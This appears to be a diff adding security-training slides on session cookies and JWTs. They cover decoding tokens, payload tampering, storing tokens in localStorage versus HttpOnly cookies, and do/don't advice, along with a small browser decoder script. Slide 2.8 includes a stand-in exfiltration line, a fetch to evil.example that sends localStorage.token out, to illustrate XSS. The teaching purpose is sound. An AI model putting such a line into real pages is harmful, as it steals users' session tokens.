@@ -6,3 +6,446 @@
   <p class="lead">HTTP forgets you after every request. Session cookies and JWTs are two ways to carry a ticket.</p>
   <div class="foot"><span>5 / 9</span><span>section 2 · sessions &amp; jwt</span></div>
 </section>
+
+<!-- Section 2 styles. Selectors are scoped to this section's slides; colors use theme tokens only. -->
+<style>
+  :is([data-section="session-cookie"], [data-section="jwt-tamper"], [data-section="token-storage"]) .code { font-size: 15px; line-height: 1.55; padding: 12px 16px; }
+  :is([data-section="jwt-decoder"], [data-section="jwt-readable"], [data-section="jwt-tamper"]) .s2-h { color: var(--reject); }
+  :is([data-section="jwt-decoder"], [data-section="jwt-readable"], [data-section="jwt-tamper"]) .s2-p { color: var(--tn-purple); }
+  :is([data-section="jwt-decoder"], [data-section="jwt-readable"], [data-section="jwt-tamper"]) .s2-s { color: var(--tn-cyan); }
+  :is([data-section="jwt-decoder"], [data-section="jwt-readable"], [data-section="jwt-tamper"]) .s2-dot { color: var(--muted); font-weight: 700; }
+  :is([data-section="jwt-decoder"], [data-section="jwt-tamper"]) .s2-bad { color: var(--reject); font-weight: 700; }
+  :is([data-section="jwt-decoder"], [data-section="jwt-tamper"]) .s2-good { color: var(--allow); font-weight: 700; }
+
+  #s2-jwt-token {
+    font-family: var(--mono); font-size: 20px; line-height: 1.5; word-break: break-all;
+    padding: 14px 18px; background: var(--surface-alt); border-radius: var(--r-md);
+  }
+  #s2-jwt-paste { display: flex; align-items: center; gap: 12px; font-size: 15px; color: var(--muted); }
+  #s2-jwt-input {
+    flex: 1; min-width: 0; font-family: var(--mono); font-size: 14px; color: var(--ink);
+    background: var(--surface-alt); border: 1px solid var(--hairline); border-radius: var(--r-sm); padding: 8px 12px;
+  }
+  #s2-jwt-input:focus { outline: none; border-color: var(--accent); }
+  #s2-jwt-sample { height: 34px; padding: 0 14px; font-family: var(--mono); font-size: 13.5px; color: var(--accent-strong); background: none; border: 0; border-radius: 6px; cursor: pointer; }
+  #s2-jwt-parts { grid-template-columns: 0.9fr 1.6fr 0.9fr; gap: 18px; }
+  #s2-jwt-parts .card { padding: 14px 18px; gap: 8px; }
+  #s2-jwt-parts .k.s2-h, #s2-jwt-parts .k.s2-p, #s2-jwt-parts .k.s2-s { color: inherit; }
+  #s2-jwt-parts .code { margin-top: 0; font-size: 15.5px; line-height: 1.5; padding: 10px 12px; white-space: pre-wrap; word-break: break-all; }
+  #s2-jwt-parts .code .c { font-style: normal; }
+  #s2-jwt-parts p { font-size: 16px; }
+
+  #s2-sessions td, #s2-sessions th { padding-top: 8px; padding-bottom: 8px; }
+  #s2-sessions .mono { font-size: 15px; }
+  #s2-sessions tr.s2-mine td { color: var(--ink); background: var(--accent-wash); }
+
+  #s2-vs td:nth-child(2), #s2-vs td:nth-child(3) { width: 38%; }
+
+  #s2-store .card p { font-size: 16.5px; }
+  #s2-store .card .code { margin-top: 0; }
+  #s2-store .s2-risk-card { border-color: var(--reject); }
+  #s2-store .s2-risk-card .k { color: var(--reject); }
+  #s2-store .s2-ok-card { border-color: var(--allow); }
+  #s2-store .s2-ok-card .k { color: var(--allow); }
+
+  #s2-dodont .card { padding: 18px 22px; }
+  #s2-dodont .s2-risk-card { border-color: var(--reject); }
+  #s2-dodont .s2-risk-card .k { color: var(--reject); }
+  #s2-dodont .s2-ok-card .k { color: var(--allow); }
+  #s2-dodont .points li { font-size: 17.5px; padding: 8px 0; }
+
+  #s2-trap { border-color: var(--reject); padding: 16px 18px; gap: 8px; }
+  #s2-trap .k { color: var(--reject); }
+  #s2-trap p { font-size: 16.5px; }
+  #s2-trap .code { font-size: 14px; padding: 10px 12px; margin-top: 4px; }
+</style>
+
+<!-- 2.1 -->
+<section class="slide" data-section="http-forgets">
+  <div class="eyebrow"><svg class="ic"><use href="#ic-user"/></svg>2.1 · HTTP forgets you</div>
+  <h2>You log in on request 1. On request 2 the server has no idea who you are.</h2>
+  <div class="split even">
+    <div class="stack">
+      <div class="code-label">without a ticket</div>
+      <pre class="code">POST /login
+{ "email": "an@demo.vn", "password": "••••••" }
+<span class="c">← 200 OK   "Welcome, An"</span>
+
+GET /orders
+<span class="c">← 401 Unauthorized   "Who are you?"</span></pre>
+      <div class="code-label" data-step="1">with a ticket</div>
+      <pre class="code" data-step="1">GET /orders
+<span class="hl">Cookie: sid=9f8c2e71b4d04a6e</span>   <span class="c">or</span>
+<span class="hl">Authorization: Bearer eyJhbGci…</span>
+<span class="c">← 200 OK   [ order #1024, order #1031 ]</span></pre>
+    </div>
+    <ul class="points tight">
+      <li>HTTP is <b>stateless</b>: every request arrives alone. The server does not remember the one before.</li>
+      <li>Sending the password with every request is a bad idea: the browser would have to keep it, and checking it (bcrypt, ~250 ms) on every call is slow.</li>
+      <li data-step="1">So after login the server hands out a <b>ticket</b>. The browser attaches it to every request.</li>
+      <li data-step="2">Two kinds of ticket: <span class="chip hot">session cookie</span> the server remembers you · <span class="chip hot">JWT</span> the ticket remembers you.</li>
+    </ul>
+  </div>
+  <div class="foot"><span>0 / 0</span><span>section 2 · sessions &amp; jwt</span></div>
+</section>
+
+<!-- 2.2 -->
+<section class="slide" data-section="session-cookie">
+  <div class="eyebrow"><svg class="ic"><use href="#ic-cookie"/></svg>2.2 · Session cookie</div>
+  <h2>The cookie is only a random ID. Who you are lives in a table on the server.</h2>
+  <div class="split code-left">
+    <div class="stack">
+      <div class="code-label">response to POST /login (one header, wrapped here)</div>
+      <pre class="code">HTTP/1.1 200 OK
+<span class="hl">Set-Cookie: sid=9f8c2e71b4d04a6e;</span>
+    HttpOnly; Secure; SameSite=Lax;
+    Path=/; Max-Age=86400</pre>
+      <div class="code-label">every request after that, sent by the browser itself</div>
+      <pre class="code">GET /orders
+<span class="hl">Cookie: sid=9f8c2e71b4d04a6e</span></pre>
+      <ul class="points tight">
+        <li><code>HttpOnly</code> JavaScript cannot read it · <code>Secure</code> HTTPS only · <code>SameSite=Lax</code> not sent with forms posted from other sites</li>
+      </ul>
+    </div>
+    <div class="stack">
+      <div class="code-label">server side: sessions table (Redis or DB)</div>
+      <table class="tbl" id="s2-sessions">
+        <thead><tr><th>session_id</th><th>user_id</th><th>expires_at</th></tr></thead>
+        <tbody>
+          <tr class="s2-mine"><td class="mono">9f8c2e71b4d04a6e</td><td class="mono">42</td><td class="mono">10-15 09:00</td></tr>
+          <tr><td class="mono">a3d10b97e5c24f18</td><td class="mono">17</td><td class="mono">10-14 21:30</td></tr>
+          <tr><td class="mono">5be0c6f2d18a4473</td><td class="mono">42</td><td class="mono">10-16 08:10</td></tr>
+        </tbody>
+      </table>
+      <ul class="points tight">
+        <li>Each request: read <code>sid</code> → look up the row → <code>user_id = 42</code>. One lookup per request.</li>
+        <li data-step="1"><span class="chip ok">logout</span> Delete the row. The next request with that <code>sid</code> gets <code>401</code> right away.</li>
+        <li data-step="2">Try it: DevTools → Application → Cookies. You will see the <code>sid</code>, never your password.</li>
+      </ul>
+    </div>
+  </div>
+  <div class="foot"><span>0 / 0</span><span>section 2 · sessions &amp; jwt</span></div>
+</section>
+
+<!-- 2.3 -->
+<!-- Sample token: HS256, signed with the demo secret "dev-only-secret-change-me" (same as demo/ server).
+     Payload: {"sub":"viewer@demo.vn","role":"viewer","iat":1791943200,"exp":1791944100}  (iat = 2026-10-14 02:00 UTC, exp = +15 min) -->
+<section class="slide" data-section="jwt-decoder">
+  <div class="eyebrow"><svg class="ic"><use href="#ic-token"/></svg>2.3 · JWT</div>
+  <h2>A JWT carries who you are inside the token, plus a signature only the server can make.</h2>
+  <div class="body" style="gap:12px;">
+    <div id="s2-jwt-token" aria-label="Sample JWT split into header, payload and signature"></div>
+    <div id="s2-jwt-paste">
+      <span>paste any JWT:</span>
+      <input id="s2-jwt-input" type="text" spellcheck="false" autocomplete="off" aria-label="JWT to decode">
+      <button id="s2-jwt-sample" type="button">↻ sample</button>
+    </div>
+    <div class="trio" id="s2-jwt-parts">
+      <div class="card">
+        <div class="k s2-h">header · how it is signed</div>
+        <pre class="code" id="s2-jwt-header"></pre>
+        <p><code>HS256</code>: signed with HMAC-SHA256 and a secret only the server has.</p>
+      </div>
+      <div class="card">
+        <div class="k s2-p">payload · the claims</div>
+        <pre class="code" id="s2-jwt-payload"></pre>
+        <p>Decoded right here with <code>atob</code>, the same thing jwt.io does.</p>
+      </div>
+      <div class="card">
+        <div class="k s2-s">signature · proof</div>
+        <pre class="code" id="s2-jwt-sig"></pre>
+        <p id="s2-jwt-sig-note"></p>
+      </div>
+    </div>
+  </div>
+  <div class="foot"><span>0 / 0</span><span>section 2 · sessions &amp; jwt</span></div>
+</section>
+
+<!-- 2.4 -->
+<section class="slide" data-section="jwt-readable">
+  <div class="eyebrow"><svg class="ic"><use href="#ic-lock"/></svg>2.4 · Base64 is not encryption</div>
+  <h2>Anyone who holds the token can read the payload. No secret needed.</h2>
+  <div class="split even">
+    <div class="stack">
+      <div class="code-label">any browser console</div>
+      <pre class="code"><span class="c">// the middle part of the token</span>
+atob("<span class="s2-p" id="s2-b64-in"></span>")
+<span class="c">// →</span>
+<span id="s2-b64-out"></span></pre>
+      <div class="code-label">same thing: paste the token into jwt.io</div>
+    </div>
+    <ul class="points tight">
+      <li><b>Base64</b> just rewrites bytes with 64 safe characters so they fit in a header or URL. It is reversible by anyone, like a different alphabet.</li>
+      <li data-step="1"><span class="chip risk">never inside</span> passwords or hashes, card numbers, national ID, API keys, anything you would not print on a receipt.</li>
+      <li data-step="2"><span class="chip ok">fine inside</span> user id, role, expiry. Things the user is allowed to know about themselves.</li>
+      <li data-step="2">The signature (next slide) stops people from <b>changing</b> the token. It does nothing to stop them <b>reading</b> it.</li>
+    </ul>
+  </div>
+  <div class="foot"><span>0 / 0</span><span>section 2 · sessions &amp; jwt</span></div>
+</section>
+
+<!-- 2.5 -->
+<section class="slide" data-section="jwt-tamper">
+  <div class="eyebrow"><svg class="ic"><use href="#ic-shield"/></svg>2.5 · What if I edit the payload?</div>
+  <h2>Change "viewer" to "admin" and the signature stops matching. The server answers 401.</h2>
+  <div class="split even">
+    <div class="stack">
+      <div class="code-label">the attacker decodes their own token</div>
+      <pre class="code">{ "sub": "viewer@demo.vn", "role": "<span class="hl">viewer</span>", … }</pre>
+      <div class="code-label" data-step="1">edits one word, encodes it again, keeps the old signature</div>
+      <pre class="code" data-step="1">{ "sub": "viewer@demo.vn", "role": "<span class="s2-bad">admin</span>", … }
+
+<span class="s2-h">eyJhbGci…</span><span class="s2-dot">.</span><span class="s2-p">eyJzdWIi…<span class="hl">new</span>…fQ</span><span class="s2-dot">.</span><span class="s2-s">XxLJzh34…<span class="hl">old</span></span></pre>
+      <div class="code-label" data-step="2">what the server does on every request</div>
+      <pre class="code" data-step="2">expected = HMAC-SHA256(header.payload, secret)
+         = <span class="s2-s">JQxpmG8lMZqnyfN5…</span>
+in token = <span class="s2-s">XxLJzh34muY1zOIZ…</span>
+           <span class="s2-bad">✗ no match → 401 Unauthorized</span></pre>
+    </div>
+    <div class="stack">
+      <ul class="points tight">
+        <li>Editing the payload takes five seconds. Base64 is not a lock (2.4).</li>
+        <li data-step="1">The signature was made from the <b>old</b> payload with the server's secret. Without the secret, nobody can make a matching new one.</li>
+        <li data-step="2">So the signature protects against <b>changes</b>. That is all it does.</li>
+      </ul>
+      <div class="card" id="s2-trap" data-step="3">
+        <div class="k">the trap that really happened</div>
+        <p>Some servers accepted <code>"alg": "none"</code> with an empty signature, or called <code>decode()</code> where they meant <code>verify()</code>. Both skip the check entirely.</p>
+        <pre class="code">jwt.verify(token, secret, { algorithms: ["HS256"] })</pre>
+        <p>Always verify with a library, and name the algorithm yourself.</p>
+      </div>
+    </div>
+  </div>
+  <div class="foot"><span>0 / 0</span><span>section 2 · sessions &amp; jwt</span></div>
+</section>
+
+<!-- 2.6 -->
+<section class="slide" data-section="session-vs-jwt">
+  <div class="eyebrow"><svg class="ic"><use href="#ic-key"/></svg>2.6 · Session or JWT?</div>
+  <h2>Sessions are easy to cancel. JWTs are easy to check without a database. Pick the one you need.</h2>
+  <div class="body" style="gap:16px;">
+    <table class="tbl" id="s2-vs">
+      <thead><tr><th></th><th>session cookie</th><th>JWT</th></tr></thead>
+      <tbody>
+        <tr><td class="name">Where "who you are" lives</td><td>Server: sessions table (Redis / DB)</td><td>Inside the token, on the client</td></tr>
+        <tr><td class="name">Each request</td><td>One lookup by <code>sid</code></td><td>Check the signature, no lookup</td></tr>
+        <tr><td class="name">Logout / ban a user</td><td><span class="chip ok">instant</span> delete the row</td><td><span class="chip risk">waits</span> token works until <code>exp</code></td></tr>
+        <tr><td class="name">Size on the wire</td><td>~30 characters</td><td>200 – 1000 characters</td></tr>
+        <tr><td class="name">Good fit</td><td>A web app with one backend that needs instant logout</td><td>Several services that check the token on their own, mobile apps</td></tr>
+      </tbody>
+    </table>
+    <ul class="points tight">
+      <li data-step="1"><span class="chip risk">big JWT downside</span> You cannot take it back before <code>exp</code>. A stolen token keeps working. Adding a "revoked" list means a lookup per request again.</li>
+      <li data-step="2">The usual fix: keep <code>exp</code> short. Next slide.</li>
+    </ul>
+  </div>
+  <div class="foot"><span>0 / 0</span><span>section 2 · sessions &amp; jwt</span></div>
+</section>
+
+<!-- 2.7 -->
+<section class="slide" data-section="access-refresh">
+  <div class="eyebrow"><svg class="ic"><use href="#ic-clock"/></svg>2.7 · Access token + refresh token</div>
+  <h2>A short access token limits the damage. A long refresh token saves the user from logging in again.</h2>
+  <div class="body" style="gap:16px;">
+    <div class="two" style="gap:22px;">
+      <div class="card" style="padding:16px 20px; gap:8px;">
+        <div class="k">access token · JWT · 15 min</div>
+        <p>Sent on every API call: <code>Authorization: Bearer eyJ…</code></p>
+        <p>Stolen? It works for at most 15 minutes.</p>
+      </div>
+      <div class="card" style="padding:16px 20px; gap:8px;">
+        <div class="k">refresh token · 7 – 30 days</div>
+        <p>Sent only to <code>POST /auth/refresh</code> to get a new access token.</p>
+        <p>Stored on the server, so it can be deleted. Logout = delete it.</p>
+      </div>
+    </div>
+    <div class="chart meter"><svg id="s2-tl" role="img" aria-label="Timeline: an access token renewed every 15 minutes by a long-lived refresh token, and what happens after logout"></svg></div>
+  </div>
+  <div class="foot"><span>0 / 0</span><span>section 2 · sessions &amp; jwt</span></div>
+</section>
+
+<!-- 2.8 -->
+<section class="slide" data-section="token-storage">
+  <div class="eyebrow"><svg class="ic"><use href="#ic-lock"/></svg>2.8 · Where the browser keeps it</div>
+  <h2>Any script on the page can read localStorage. No script can read an HttpOnly cookie.</h2>
+  <div class="body" style="gap:16px;" id="s2-store">
+    <div class="two" style="gap:22px;">
+      <div class="card s2-risk-card">
+        <div class="k">localStorage</div>
+        <pre class="code">localStorage.setItem("token", jwt)
+
+<span class="c">// one injected script is enough:</span>
+fetch("https://evil.example?t=" + localStorage.token)</pre>
+        <p>Every script on the page can read it: yours, an npm package's, or one an attacker slipped in (XSS).</p>
+      </div>
+      <div class="card s2-ok-card">
+        <div class="k">HttpOnly cookie</div>
+        <pre class="code">Set-Cookie: token=eyJ…; HttpOnly; Secure; SameSite=Lax
+
+document.cookie   <span class="c">// "" (JS cannot see it)</span></pre>
+        <p>The browser still sends it on every request to your API. JavaScript, including attacker scripts, never sees the value.</p>
+      </div>
+    </div>
+    <ul class="points tight">
+      <li data-step="1"><span class="chip ok">default</span> Put tokens in a cookie with <code>HttpOnly; Secure; SameSite=Lax</code>.</li>
+      <li data-step="2"><span class="chip">trade-off</span> The browser sends cookies by itself, which opens the door to CSRF. <code>SameSite</code> closes most of it. Both attacks: XSS (4.5) and CSRF (4.6).</li>
+    </ul>
+  </div>
+  <div class="foot"><span>0 / 0</span><span>section 2 · sessions &amp; jwt</span></div>
+</section>
+
+<!-- 2.9 -->
+<section class="slide" data-section="sessions-do-dont">
+  <div class="eyebrow"><svg class="ic"><use href="#ic-shield"/></svg>2.9 · Do / Don't</div>
+  <h2>Use a library, keep tokens short-lived, and keep them out of JavaScript's reach.</h2>
+  <div class="two" id="s2-dodont" style="gap:22px; flex:1; min-height:0; align-items:start;">
+    <div class="card s2-ok-card">
+      <div class="k">do</div>
+      <ul class="points tight">
+        <li>Use your framework's session or a JWT library. Don't hand-roll either.</li>
+        <li>Set cookies with <code>HttpOnly; Secure; SameSite=Lax</code>.</li>
+        <li>Verify every JWT with a library, and pin the algorithm: <code>algorithms: ["HS256"]</code>.</li>
+        <li>Keep access tokens short (<code>exp</code> ≈ 15 min). Refresh tokens live on the server.</li>
+        <li>On logout, delete the session row or the refresh token.</li>
+      </ul>
+    </div>
+    <div class="card s2-risk-card">
+      <div class="k">don't</div>
+      <ul class="points tight">
+        <li>Put passwords, card numbers or personal data in a JWT payload. Anyone can read it.</li>
+        <li>Call <code>decode()</code> and trust the result. Only <code>verify()</code> checks the signature.</li>
+        <li>Store tokens in <code>localStorage</code>.</li>
+        <li>Issue JWTs that live for days with no way to cancel them.</li>
+        <li>Commit the signing secret. Read it from env.</li>
+      </ul>
+    </div>
+  </div>
+  <div class="foot"><span>0 / 0</span><span>section 2 · sessions &amp; jwt</span></div>
+</section>
+
+<script>
+(() => {
+  const { el, scale, $ } = window.Charts;
+
+  // ---------- 2.3 JWT decoder (runs in the browser, atob on base64url) ----------
+  const SAMPLE = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'
+    + '.eyJzdWIiOiJ2aWV3ZXJAZGVtby52biIsInJvbGUiOiJ2aWV3ZXIiLCJpYXQiOjE3OTE5NDMyMDAsImV4cCI6MTc5MTk0NDEwMH0'
+    + '.XxLJzh34muY1zOIZMLNazIYvwkwo5siq6a9zXJai-uE';
+
+  const esc = (s) => String(s).replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
+  const b64urlBytes = (s) => {
+    let b = s.replace(/-/g, '+').replace(/_/g, '/');
+    b += '='.repeat((4 - (b.length % 4)) % 4);
+    return Uint8Array.from(atob(b), (c) => c.charCodeAt(0));
+  };
+  const b64urlText = (s) => new TextDecoder().decode(b64urlBytes(s));
+  const hhmm = (sec) => new Date(sec * 1000).toISOString().slice(11, 16) + ' UTC';
+
+  const NOTES = {
+    sub: () => 'who',
+    role: () => 'what they may do',
+    iat: (v) => 'issued ' + hhmm(v),
+    exp: (v, o) => (typeof o.iat === 'number' ? `+${Math.round((v - o.iat) / 60)} min: ` : 'expires ') + hhmm(v),
+  };
+  // Pretty JSON with a grey comment after each known claim.
+  function annotate(obj) {
+    const keys = Object.keys(obj);
+    const lines = keys.map((k, i) => {
+      const comma = i < keys.length - 1 ? ',' : '';
+      const numeric = k === 'iat' || k === 'exp';
+      const note = NOTES[k] && (!numeric || typeof obj[k] === 'number') ? NOTES[k](obj[k], obj) : '';
+      return `  "${esc(k)}": ${esc(JSON.stringify(obj[k]))}${comma}` + (note ? `  <span class="c">// ${esc(note)}</span>` : '');
+    });
+    return `{\n${lines.join('\n')}\n}`;
+  }
+
+  function decode(token) {
+    const tokEl = $('s2-jwt-token');
+    const parts = token.trim().split('.');
+    const [h = '', p = '', s = ''] = parts;
+    tokEl.innerHTML = `<span class="s2-h">${esc(h)}</span><span class="s2-dot">.</span>`
+      + `<span class="s2-p">${esc(p)}</span><span class="s2-dot">.</span><span class="s2-s">${esc(s)}</span>`;
+    const show = (id, html) => { $(id).innerHTML = html; };
+    if (parts.length !== 3) {
+      show('s2-jwt-header', `<span class="s2-bad">not a JWT: expected 3 parts, got ${parts.length}</span>`);
+      show('s2-jwt-payload', '');
+      show('s2-jwt-sig', '');
+      $('s2-jwt-sig-note').textContent = '';
+      return;
+    }
+    for (const [id, seg] of [['s2-jwt-header', h], ['s2-jwt-payload', p]]) {
+      try { show(id, annotate(JSON.parse(b64urlText(seg)))); }
+      catch { show(id, '<span class="s2-bad">not valid base64url JSON</span>'); }
+    }
+    try {
+      const bytes = b64urlBytes(s);
+      const hex = [...bytes.slice(0, 8)].map((b) => b.toString(16).padStart(2, '0')).join(' ');
+      show('s2-jwt-sig', `${esc(hex)} …\n<span class="c">${bytes.length} bytes, not JSON</span>`);
+    } catch { show('s2-jwt-sig', '<span class="s2-bad">not valid base64url</span>'); }
+    $('s2-jwt-sig-note').innerHTML = 'HMAC-SHA256(header.payload, <b>secret</b>). Only the server knows the secret.';
+  }
+
+  const input = $('s2-jwt-input');
+  input.value = SAMPLE;
+  input.addEventListener('input', () => decode(input.value));
+  // deck.js ignores keys typed in an <input>; Escape gives the keyboard back to the deck.
+  input.addEventListener('keydown', (e) => { if (e.key === 'Escape') input.blur(); });
+  $('s2-jwt-sample').addEventListener('click', () => { input.value = SAMPLE; decode(SAMPLE); });
+  decode(SAMPLE);
+
+  // ---------- 2.4 the same payload, decoded live ----------
+  const mid = SAMPLE.split('.')[1];
+  $('s2-b64-in').textContent = mid.slice(0, 26) + '…';
+  const json = b64urlText(mid);
+  $('s2-b64-out').textContent = "'" + json.replace(/,"iat"/, ',\n "iat"') + "'";
+
+  // ---------- 2.7 access / refresh timeline ----------
+  function timeline(svg) {
+    const W = 1160, H = 222, L = 150, R = 120;
+    svg.setAttribute('viewBox', `0 0 ${W} ${H}`);
+    const x = scale(0, 120, L, W - R);          // minutes
+    const yA = 22, yR = 82, bh = 30, yAxis = 140;
+    const LOGOUT = 70;
+    const slot = x(15) - x(0);
+
+    el('text', { x: 0, y: yA + 21, class: 'sv-lbl' }, svg, 'access token');
+    el('text', { x: 0, y: yR + 21, class: 'sv-lbl' }, svg, 'refresh token');
+
+    // refresh token bars first, so the refresh dots paint on top of them
+    const live = el('g', { 'data-hide-at': '1' }, svg);
+    el('rect', { x: x(0) + 2, y: yR, width: x(120) - x(0) + 20, height: bh, rx: 6, class: 'sv-box' }, live);
+    el('text', { x: x(120) + 30, y: yR + 21, class: 'sv-lbl-sm' }, live, '→ 7–30 days');
+    const outBars = el('g', { 'data-step': '1' }, svg);
+    el('rect', { x: x(0) + 2, y: yR, width: x(LOGOUT) - x(0) - 2, height: bh, rx: 6, class: 'sv-box' }, outBars);
+    el('rect', { x: x(LOGOUT), y: yR, width: x(120) - x(LOGOUT) + 20, height: bh, rx: 6, class: 'sv-box-risk' }, outBars);
+    el('text', { x: x(LOGOUT) + 14, y: yR + 21, class: 'sv-risk' }, outBars, 'logout: refresh token deleted');
+
+    const before = el('g', {}, svg);                       // access tokens issued before logout
+    const after = el('g', { 'data-hide-at': '1' }, svg);   // the ones logout prevents
+    for (let t = 0; t < 120; t += 15) {
+      const g = t < 75 ? before : after;
+      el('rect', { x: x(t) + 2, y: yA, width: slot - 4, height: bh, rx: 6, class: 'sv-box-hot' }, g);
+      el('text', { x: x(t + 7.5), y: yA + 20, 'text-anchor': 'middle', class: 'sv-lbl-sm' }, g, '15 min');
+      if (t > 0) {
+        el('path', { d: `M${x(t)} ${yR - 2} V${yA + bh + 3}`, class: 'sv-dash' }, g);
+        el('circle', { cx: x(t), cy: yR + bh / 2, r: 6, class: 'sv-mark' }, g);
+      }
+    }
+
+    for (let t = 0; t <= 120; t += 30) {
+      el('text', { x: x(t), y: yAxis + 20, 'text-anchor': 'middle', class: 'sv-tick' }, svg, t === 0 ? 'login' : `${Math.floor(t / 60)}h${String(t % 60).padStart(2, '0')}`);
+    }
+    el('line', { x1: x(0), x2: x(120), y1: yAxis, y2: yAxis, class: 'sv-axis' }, svg);
+    el('circle', { cx: x(0) + 6, cy: yAxis + 46, r: 6, class: 'sv-mark' }, svg);
+    el('text', { x: x(0) + 20, y: yAxis + 51, class: 'sv-lbl-sm' }, svg, 'POST /auth/refresh: the refresh token buys a new 15-min access token');
+
+    // step 1: logout at 1h10. The current access token still works until its exp (1h15), then nothing.
+    const outMarks = el('g', { 'data-step': '1' }, svg);
+    el('path', { d: `M${x(LOGOUT)} ${yR - 6} V${yAxis}`, class: 'sv-limit' }, outMarks);
+    el('rect', { x: x(75) + 2, y: yA, width: x(120) - x(75) - 4, height: bh, rx: 6, class: 'sv-wait' }, outMarks);
+    el('text', { x: x(97.5), y: yA + 21, 'text-anchor': 'middle', class: 'sv-risk' }, outMarks, '401 · no new access token');
+    el('text', { x: x(0), y: yAxis + 78, class: 'sv-risk' }, outMarks, 'logout at 1h10: the access token already issued still works until 1h15, then 401.');
+  }
+  timeline($('s2-tl'));
+})();
+</script>
